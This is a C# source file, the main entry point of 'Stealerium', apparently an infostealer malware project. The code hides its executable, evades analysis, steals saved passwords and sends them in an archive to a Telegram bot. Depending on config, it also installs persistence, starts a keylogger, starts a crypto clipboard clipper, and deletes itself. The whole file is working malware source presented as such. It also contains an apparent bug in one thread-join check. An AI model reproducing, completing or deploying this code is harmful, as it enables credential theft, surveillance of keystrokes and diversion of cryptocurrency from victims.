using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Stealerium.Helpers;
using Stealerium.Modules;
using Stealerium.Modules.Implant;
using Stealerium.Target;

namespace Stealerium
{
    internal class Program
    {
        /// <summary>Defines the entry point of the application.</summary>
        [STAThread]
        private static async Task Main()
        {
            Thread
                wThread = null,
                cThread = null;

            // SSL
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            // Mutex check
            MutexControl.Check();

            // Hide executable on first start
            if (!Startup.IsFromStartup())
                Startup.HideFile();

            // If Telegram API or ID not exists => Self destruct.
            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
            {
                Logging.Log("SelfDestruct triggered because Telegram API or Telegram ID is invalid.");
                SelfDestruct.Melt();
            }
            else
            {
                Logging.Log("Telegram API and ID are valid. SelfDestruct was not triggered.");
            }

            // Start delay
            if (Config.StartDelay == "1")
                StartDelay.Run();

            // Run AntiAnalysis modules
            if (await AntiAnalysis.RunAsync().ConfigureAwait(false))
                AntiAnalysis.FakeErrorMessage();


            // Change working directory to appdata
            Directory.SetCurrentDirectory(Paths.InitWorkDir());

            // Decrypt config strings
            Config.Init();

            // Test telegram API token
            if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
            {
                Logging.Log("SelfDestruct triggered because the Telegram API token is invalid.");
                SelfDestruct.Melt();
            }
            else
            {
                Logging.Log("Telegram API token is valid. SelfDestruct was not triggered.");
            }

            // Steal passwords
            var passwords = Passwords.Save();
            // Compress directory
            var archive = Filemanager.CreateArchive(passwords);
            // Send archive
            await Telegram.SendReportAsync(archive).ConfigureAwait(false);

            // Install to startup if enabled in config and not installed
            if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
                if (!Startup.IsInstalled() && !Startup.IsFromStartup())
                    Startup.Install();

            // Run keylogger module
            if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
            {
                Logging.Log("Starting keylogger modules...");
                wThread = WindowManager.MainThread;
                wThread.SetApartmentState(ApartmentState.STA);
                wThread.Start();
            }

            // Run clipper module
            if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
            {
                Logging.Log("Starting clipper modules...");
                cThread = ClipboardManager.MainThread;
                cThread.SetApartmentState(ApartmentState.STA);
                cThread.Start();
            }

            // Wait threads
            if (wThread != null)
                if (wThread.IsAlive)
                    wThread.Join();
            if (wThread != null)
                if (cThread.IsAlive)
                    cThread.Join();

            // Remove executable if running not from startup directory
            if (!Startup.IsFromStartup())
            {
                Logging.Log("SelfDestruct triggered because the program was not started from startup.");
                SelfDestruct.Melt();
            }
            else
            {
                Logging.Log("Program started from startup. SelfDestruct was not triggered.");
            }
        }
    }
}